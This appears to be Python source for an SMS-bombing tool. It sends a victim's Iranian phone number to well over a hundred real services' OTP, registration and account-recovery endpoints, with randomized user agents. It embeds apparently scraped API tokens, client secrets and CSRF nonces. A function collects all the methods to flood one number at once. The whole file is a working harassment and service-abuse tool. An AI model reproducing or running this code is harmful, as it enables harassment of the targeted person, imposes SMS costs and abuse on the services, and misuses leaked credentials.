        js = {"apiToken":"lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j","clientSecret":"Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
    ...
    def shandiz(self):
        js = {"apiToken":"sNpW61dZELLTwNhUD2YDsVuwMvzUihTLIEYpCSJDjXfH7GMfmDr9j5eWc4KJAJ2h","clientSecret":"va41e57WSFf6qO8o6i9oiAe5PcLuG3lS","device":"web","username":"0" + self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: #shandiz.co
            post(url="https://restaurant.delino.com/user/register",json=js,timeout=1,headers=__rhead)
            return True
    ...
    def tnovin(self):
        ...
        try: 
            post(url="http://shop.tnovin.com/login",data=f"phone=0{self.phone.split('+98')[1]}",headers=head)
            return True
        except:return False

    def dastkhat(self):
        __n4 = {"mobile":self.phone.split('+98')[1],"countryCode":98,"device_os":2}
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://dastkhat-isad.ir/api/v1/user/store",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def hamlex(self):
        __n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{self.phone.split('+98')[1]}&register="
        ...
        try: 
            post(url="https://hamlex.ir/register.php",data=__n4,headers=h4)
            return True
        except:return False

    def irwco(self):
        __n4 =  f"mobile=0{self.phone.split('+98')[1]}"
        ...
        try: 
            post(url="https://irwco.ir/register",data=__n4,headers=h4)
            return True
        except:return False

            
    def moshaveran724(self):
        __n4 =  f"againkey=0{self.phone.split('+98')[1]}&cache=false"
        ...
        try: 
            post(url="https://moshaveran724.ir/m/pms.php",data=__n4,headers=h4)
            return True
        except:return False
    ...
    def sibbank(self):
        ...
        try: 
            post(url="https://api.sibbank.ir/v1/auth/login",json=__n4,headers=h4)
            return True
        except:return False
    ...
    def snapp_link(self):
        ...
        try: 
            post(url="https://api.snapp.ir/api/v1/sms/link",json=__n4,headers=h4)
            return True
        except:return False

            
    def steelalborz(self):
        __n4 = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split("+98")[1]}&csrf=2aae5b41f1&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{self.phone.split("+98")[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=2aae5b41f1'
        ...
        try: 
            post(url="https://steelalborz.com/wp-admin/admin-ajax.php",data=__n4,headers=h4)
            return True
        except:return False
    ...
    def miare(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://www.miare.ir/api/otp/driver/request/",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

                    
    def arshiyan(self):
        __n4 = {"country_code":"98","phone_number":self.phone.split('+98')[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.arshiyan.com/send_code",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def topnoor(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://backend.topnoor.ir/web/v1/user/otp",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def alinance(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alinance.com/user/register/mobile/send/",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False


    def alopeyk(self):
        __n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+self.phone.split('+98')[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alopeyk.com/api/v2/login?platform=pwa",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def alopeyk_safir(self):
        __n4 = {'phone':'0'+self.phone.split('+98')[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alopeyk.com/safir-service/api/v1/login",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def balad(self):
        __n4 = {"phone_number":"0"+self.phone.split('+98')[1],"os_type":"W"}
        __rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/json','device-id': '572a5145-d472-430a-9614-b258232873e6','origin': 'https://balad.ir','referer': 'https://balad.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://account.api.balad.ir/api/web/auth/login/",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def chaymarket(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
        ...
        try: 
            post(url="https://www.chaymarket.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def coffefastfoodluxury(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"
        ...
        try: 
            post(url="https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def dadhesab(self):
        ...
        try: 
            post(url="https://api.dadhesab.ir/user/entry",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def dosma(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://app.dosma.ir/sendverify/",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def ehteraman(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.ehteraman.com/api/request/otp",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def flightio(self):
        __n4 = {"userKey":"98-"+self.phone.split('+98')[1],"userKeyType":1}
        ...
        try: 
            post(url="https://app.flightio.com/bff/Authentication/CheckUserKey",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def foodcenter(self):
        #کد رو توی ریسپانس برمیگردونه
        __n4 = f"mobile=0{self.phone.split('+98')[1]}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1"
        ...
        try: 
            post(url="https://www.foodcenter.ir/account/sabtmobile",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def shop_mci(self):
        __n4 = {"msisdn":self.phone.split('+98')[1]}
        ...
        try: 
            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def hamrahbours(self):
        __n4 = {"MobileNumber":"0"+self.phone.split('+98')[1]}
        __rhead = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b','authorization': 'Bearer undefined','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.hbbs.ir','origin': 'https://app.hbbs.ir','referer': 'https://app.hbbs.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.hbbs.ir/authentication/SendCode",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def homtick(self):
        __n4 = {"mobileOrEmail":"0"+self.phone.split('+98')[1],"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://auth.homtick.com/api/V1/User/GetVerifyCode",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def iranamlaak(self):
        __n4 = {"AgencyMobile":"0"+self.phone.split('+98')[1]}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def karchidari(self):
        ...
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.kcd.app/api/v1/auth/login",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def kardoon(self):
        __n4 = {"optype":15,"userid":0,"mobile":"0"+self.phone.split('+98')[1],"firstname":"","lastname":"","cityid":0,"email":"","birthdate":"","gender":False,"avatarid":0,"packagename":"","versioncode":-1,"tokenkey":"","username":"","password":"","connectionname":"MainConStr"}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://app.kardoon.ir:4433/api/users",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def mazoo(self):
        __n4 = {"phone":self.phone.split('+98')[1]}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://mazoocandle.ir/login",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def ostadkr(self):
        ...
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.ostadkr.com/login",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def paymishe(self):
        ...
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def nesengrill(self):
        __n4 = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0"+self.phone.split('+98')[1]}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def sizdah50(self):
        __n4 = {"apiToken":"BYE7T3P73xwG8KKjUemqnpmtfi3CFKHt00w92hlBpGODB4dta45Z6qtVwUbvAM1s","clientSecret":"DJXBtleZru9SVf9uVnoG63E2I6dxzvkB","device":"web","username":"0"+self.phone.split('+98')[1]}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=__n4,timeout=1,headers=__rhead)
            return True
    ...
    def zerocafe(self):
        __n4 = {"apiToken":"DBpPbfB2X7ZTnSyrugfKWuLoDbjn5VXAPgqVengvZznDEWoJV0y6x4GS1AL06Y7B","clientSecret":"51NZdnUk0cJClzlQCpz0S9YwMM0Fx9t2","device":"web","username":"0"+self.phone.split('+98')[1]}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=__n4,timeout=1,headers=__rhead)
            return True
    ...
    def podro(self):
        __n4 = {"username":self.phone.split('+98')[1],"otp_provider":"INTERNAL","profile":{"name":"","national_code":""},"companies":[{"name":"kljkjjhhjjhde66","slug":"kljkjjhhjjhde66"}]}
        ...
        try: 
            post(url="https://api.podro.com/back4front/accounts/register",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def rayshomar(self):
        __n4 = f"MobileNumber=0{self.phone.split('+98')[1]}"
        ...
        try: 
            post(url="https://api.rayshomar.ir/api/Register/RegistrMobile",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def refahtea(self):
        __n4 = f"action=refah_send_code&mobile=0{self.phone.split('+98')[1]}&security=c68b01b32a"
        ...
        try: 
            post(url="https://refahtea.ir/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def shahrhayejadid(self):
        __n4 = f"mobile=0{self.phone.split('+98')[1]}"
    ...
    def snapp_drivers(self):
        __n4 = {'cellphone':'0'+self.phone.split('+98')[1]}
        __rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
        try: 
            post(url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def mamifood(self):
        ...
        __rhead = {'Content-Type': 'application/json','user-agent': generate_user_agent()}
        try: 
            post(url="https://mamifood.org/Registration.aspx/SendValidationCode",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def uphone(self):
        ...
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://server.uphone.ir/api/v1/login/otp/request",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def abantether(self):
        __n4 = {"phoneNumber":"0"+self.phone.split('+98')[1],"email":""}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://abantether.com/users/register/phone/send/",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def amoomilad(self):
        __n4 = {"Token":"5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+self.phone.split('+98')[1],"Helper":77942}
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
            
    def ashraafi(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={self.phone.split('+98')[1]}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={self.phone.split('+98')[1]}&dig_otp=&dig_nounce=54dfdabe34"
        ...
        try: 
            post(url="https://ashraafi.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
            
    def bandarazad(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
        ...
        try: 
            post(url="https://bandarazad.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def bazidone(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={self.phone.split('+98')[1]}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{self.phone.split('+98')[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
        ...
        try: 
            post(url="https://bazidone.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def bigtoys(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
        ...
        try:
            post(url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def bitex24(self):
        ...
        try:
            get(url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{self.phone.split('+98')[1]}&dial_code=0",timeout=1,headers=HEADER)
        except:return False

            
    def candoosms(self):
        __n4 = f"action=send_sms&phone=0{self.phone.split('+98')[1]}"
        ...
        try:
            post(url="https://www.candoosms.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def farsgraphic(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={self.phone.split('+98')[1]}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={self.phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
        ...
        try:
            post(url="https://farsgraphic.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def glite(self):
        __n4 = f"action=logini_first&login=0{self.phone.split('+98')[1]}"
        ...
        try:
            post(url="https://www.glite.ir/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def instagram(self):
        __n4 = f"email_or_username=%2B{self.phone.split('+')[1]}&recaptcha_challenge_field=&flow=&app_id=&source_account_id="
        ...
        try:
            post(url="https://www.instagram.com/accounts/account_recovery_send_ajax/",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def hemat(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
        ...
        try:
            post(url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def kodakamoz(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
        ...
        try:
            post(url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def mipersia(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
        ...
        try:
            post(url="https://www.mipersia.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def novinbook(self):
        __n4 = f"phone=0{self.phone.split('+98')[1]}"
        ...
        try:
            post(url="https://novinbook.com/index.php?route=account/phone",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def offch(self):
        ...
        __rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.offch.com/auth/otp",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
    ...
    def raminashop(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=d397aa3b0e&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A7%D8%AA%D8%B1%D8%AA%DB%8C%D8%A8%D8%A8&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=d397aa3b0e"
        ...
        try: 
            post(url="https://raminashop.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

            
    def sabziman(self):
        __n4 = f"action=newphoneexist&phonenumber=0{self.phone.split('+98')[1]}"
        ...
        try:
            post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
            
            
    def tajtehran(self):
        __n4 = f"mobile=0{self.phone.split('+98')[1]}&password=mamad1234"
        ...
        try:
            post(url="https://tajtehran.com/RegisterRequest",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
            
            
    def zivanpet(self):
        __n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{self.phone.split('+98')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{self.phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
        ...
        try:
            post(url="https://zivanpet.com/wp-admin/admin-ajax.php",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
            
            
    def okala(self):
        __n4 = {"mobile":"0"+ self.phone.split('+98')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
        __rhead = {'user-agent': generate_user_agent(os="win")}
        try:
            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False            
...
'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
        try:
            post(url="https://gharar.ir/users/phone_number/",data=__n4,timeout=1,headers=__rhead)
            return True
        except:return False            
    def ragham(self):
        __n4 = {"phone":self.phone}
        __rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://web.raghamapp.com/api/users/code",json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False

    def paklean_call(self):
        __n4 = {"username": "0"+self.phone.split("+98")[1]}
        __rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://client.api.paklean.com/user/resendVoiceCode", json=__n4,timeout=1,headers=__rhead)
            return True
        except:return False
...
def run(shomare):
    s= sms(f"+98{shomare}")
    r = [s.a4baz,s. abantether,s. achar,s. alibaba,s. alinance,s. alopeyk,s. alopeyk_safir,s. amoomilad,s. anar,s. arka,s. arshiyan,s. ashraafi,s. azki,s. bahram_shop,s. balad,s. bama,s. banankala,s. bandarazad,s. banimode,s. basalam,s. baskol,s. bazidone,s. beheshticarpet,s. bigtoys,s. bimito,s. binjo,s. bit24,s. bitex24,s. candoosms,s. chamedoon,s. chaymarket,s. cinematicket,s. coffefastfoodluxury,s. dadhesab,s. dadpardaz,s. dastkhat,s. delino,s. devslop,s. deyfriedchicken,s. dicardo,s. didnegar,s. digikala,s. digikalajet,s. digipay,s. digistyle,s. divar,s. doctor,s. doctoreto,s. donergarden,s. dosma,s. drdr,s. drsaina,s. ehteraman,s. emtiaz,s. exo,s. express,s. farsgraphic,s. filmnet,s. flightio,s. foodbell,s. foodcenter,s. foodiran16,s. foodlandkish,s. gap,s. gapfilm,s. garcon,s. gelatohouse,s. ghabzino,s. gharar,s. ghasedak24,s. givernfood,s. glite,s. hamlex,s. hamrahbours,s. helsa,s. hemat,s. hiword,s. homtick,s. hyperjan,s. instagram,s. iranamlaak,s. iranicard,s. iranketab,s. irantic,s. irwco,s. itoll,s. kafegheymat,s. karchidari,s. kardoon,s. ketabchi,s. khanoumi,s. khodro45,s. kilid,s. kodakamoz,s. lendo,s. limome,s. mahiyekhoob,s. mamifood,s. mashinbank,s. mazoo,s. mci,s. mek,s. melix,s. miare,s. mihanpezeshk,s. mipersia,s. mobogift,s. moshaveran724,s. namava,s. nesengrill,s. nobat,s. novinbook,s. offch,s. offdecor,s. okala,s. okcs,s. okorosh,s. olgoo,s. opco,s. ostadkr,s. otaghak,s. pakhsh,s. paklean,s. paklean_call,s. paymishe,s. pezeshket,s. pinket,s. pirankalaco,s. pizzapanjereh,s. podro,s. pubgsell,s. pubisha,s. ragham,s. raminashop,s. rayshomar,s. refahtea,s. rojashop,s. rokla,s. rubika,s. sTrip,s. sabziman,s.safiran,s. see5,s. seebirani,s. shab,s. shad,s. shahrfarsh,s. shahrhayejadid,s. shandiz,s. sheypoor,s. shop_mci,s. sibbank,s. sibbazar,s. simkhanF,s. simkhanT,s. sizdah50,s. smarket,s. snap,s. snapfood,s. snapp,s. snapp_drivers,s. snapp_link,s. steelalborz,s. taghche,s. tajtehran,s. takfarsh,s. tamland,s. tap30,s. tapsi,s. tikban,s. timcheh,s. tj8,s. tmg,s. tnovin,s. topnoor,s. torob,s. uphone,s. virgool,s. watchonline,s. wis,s. zerocafe,s. zivanpet]
